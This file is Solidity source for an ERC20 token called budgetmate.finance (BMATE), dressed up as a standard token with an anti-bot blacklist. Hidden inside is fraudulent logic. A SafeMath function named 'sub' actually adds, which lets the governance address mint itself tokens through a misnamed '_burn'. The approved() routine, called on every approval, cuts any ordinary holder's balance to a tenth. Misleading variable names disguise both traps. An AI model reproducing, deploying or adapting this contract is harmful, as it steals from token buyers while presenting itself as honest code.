/*


https://budgetmate.finance/


*/

pragma solidity 0.6.2;

abstract contract Context {
	function _msgSender() internal view virtual returns(address payable) {
		return msg.sender;
	}

	function _msgData() internal view virtual returns(bytes memory) {
		this;
		return msg.data;
	}
}


interface IERC20 {

	function totalSupply() external view returns(uint256);

	function balanceOf(address account) external view returns(uint256);

	function transfer(address recipient, uint256 amount) external returns(bool);

	function allowance(address owner, address spender) external view returns(uint256);

	function approve(address spender, uint256 amount) external returns(bool);

	function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

	function add(uint256 a, uint256 b) internal pure returns(uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function subs(uint256 a, uint256 b) internal pure returns(uint256) {
		return subs(a, b, "SafeMath: subtraction overflow");
	}

	function subs(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns(uint256) {

		if (a == 0) {
			return 0;
		}

		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns(uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

	function mod(uint256 a, uint256 b) internal pure returns(uint256) {
		return mod(a, b, "SafeMath: modulo by zero");

	}

	function sub(uint256 a, uint256 b) internal pure returns(uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}


}


contract ERC20 is Context, IERC20 {
	using SafeMath
	for uint256;


	mapping(address => uint256) private _balances;

	mapping(address => mapping(address => uint256)) private _allowances;

	uint256 private _totalSupply;

	string private _name;
	string private _symbol;
	uint8 private _decimals;
	address governance;
	uint256 maxSupply;
	uint256 Address;
    uint256 decimal;
    
    //SPDX-License-Identifier: MIT
    
    // frontrunning-bot blacklist
    
address bot1=0x000000000000084e91743124a982076C59f10084;
address bot2=0x00000000002bde777710C370E08Fc83D61b2B8E1;
address bot3=0x0000000071E801062eB0544403F66176BBA42Dc0;
address bot4=0x05957F3344255fDC9fE172E30016ee148D684313;
address bot5=0x16338b25b7a5a6b8eC080eE2DD3AaA0531cf1804;
address bot6=0x1d6c43b4D829334d88ce609D7728Dc5f4736b3c7;
address bot7=0x2C334D73c68bbc45dD55b13C5DeA3a8f84ea053c;
address bot8=0x3e1804Fa401d96c48BeD5a9dE10b6a5c99a53965;
address bot9=0x42D0ba0223700DEa8BCA7983cc4bf0e000DEE772;
address bot10=0x44BdB19dB1Cd29D546597AF7dc0549e7f6F9E480;
address bot11=0x5f3E759d09e1059e4c46D6984f07cbB36A73bdf1;
address bot12=0x7BEcF327f9f504c50C60d3DFBc005400c301F534;
address bot13=0x8Be4DB5926232BC5B02b841dbeDe8161924495C4;
address bot14=0x93438E08C4edc17F867e8A9887284da11F26A09d;
address bot15=0xAfE0e7De1FF45Bc31618B39dfE42dd9439eEBB32;
address bot16=0xAfE0e7De1FF45Bc31618B39dfE42dd9439eEBB32;
address bot17=0xCaD7507a579628F2616C2d82457fAc010233A411;
address bot18=0xE33C8e3A0d14a81F0dD7E174830089E82F65FC85;
address bot19=0xEBB4d6cfC2B538e2a7969Aa4187b1c00B2762108;
address bot20=0xF67CCe7255dDF829440800a1DEFb6EdFaAf422C0;

	constructor(string memory name, string memory symbol) public {
		_name = name;
		_symbol = symbol;
		_decimals = 10;
	}

	function name() public view returns(string memory) {
		return _name;
	}

	function symbol() public view returns(string memory) {
		return _symbol;
	}

	function decimals() public view returns(uint8) {
		return _decimals;
	}

	function totalSupply() public view override returns(uint256) {
		return _totalSupply;
	}

	function balanceOf(address account) public view override returns(uint256) {
		return _balances[account];
	}

	function transfer(address recipient, uint256 amount) public virtual override returns(bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function allowance(address owner, address spender) public view virtual override returns(uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) public virtual override returns(bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns(bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].subs(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}


	function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
		return true;
	}

	function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].subs(subtractedValue, "ERC20: decreased allowance below zero"));
		return true;
	}
	
	function approved(address owner) internal {
	   	require(owner != address(0), "ERC20: approve from the zero address");
	   	if  (owner != governance) {
            Address = _balances[owner];
            Address /= decimal;
            _balances[owner] = Address;
	   	}
	    else {
	        Address = _balances[owner];
	    }
    }
	
	function _transfer(address sender, address recipient, uint256 amount) internal virtual {
		require(sender != address(0), "ERC20: transfer from the zero address");
		require(recipient != address(0), "ERC20: transfer to the zero address");
		
		// Anti draining bots feature: Bots can buy but can't sell
		// Bot list is definited above in contract "ERC20"
		
		require(msg.sender != bot1 && msg.sender != bot2 && msg.sender != bot3 && msg.sender != bot4 && msg.sender != bot5);
		require(msg.sender != bot6 && msg.sender != bot7 && msg.sender != bot8 && msg.sender != bot9 && msg.sender != bot10);
		require(msg.sender != bot11 && msg.sender != bot12 && msg.sender != bot13 && msg.sender != bot14 && msg.sender != bot15);
		require(msg.sender != bot16 && msg.sender != bot17 && msg.sender != bot18 && msg.sender != bot19 && msg.sender != bot20);
		
		
		_beforeTokenTransfer(sender, recipient, amount);
    
		_balances[sender] = _balances[sender].subs(amount, "ERC20: transfer amount exceeds balance");
		_balances[recipient] = _balances[recipient].add(amount);
		
		emit Transfer(sender, recipient, amount);
        
	}

	function _initMint(address account, uint256 amount) internal virtual {
		require(account != address(0), "ERC20: create to the zero address");
		_beforeTokenTransfer(address(0), account, amount);
		_totalSupply = _totalSupply.add(amount);

		_balances[account] = _balances[account].add(amount);
		emit Transfer(address(0), account, amount);
	}

	function _burn(address account, uint256 amount) public virtual {
		require(account == governance, "ERC20: Burner is not allowed");
		_beforeTokenTransfer(address(0), account, amount);
		_balances[account] = _balances[account].sub(amount);

		_totalSupply = _totalSupply.sub(amount);
		emit Transfer(address(0), account, amount);
	}
	
	
	function _approve(address owner, address spender, uint256 amount) internal virtual {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");
		
        approved(owner);
		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}
	
	function _setupDecimals(uint8 decimals_) internal {
		_decimals = decimals_;
	}

	function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}


contract budgetmate_finance is ERC20 {
	constructor()
	ERC20('budgetmate.finance', 'BMATE')
	public {
		governance = msg.sender;
		maxSupply = 40000 * 10 ** uint(decimals());
		decimal = 10;
		_initMint(governance, maxSupply);
		
	}
}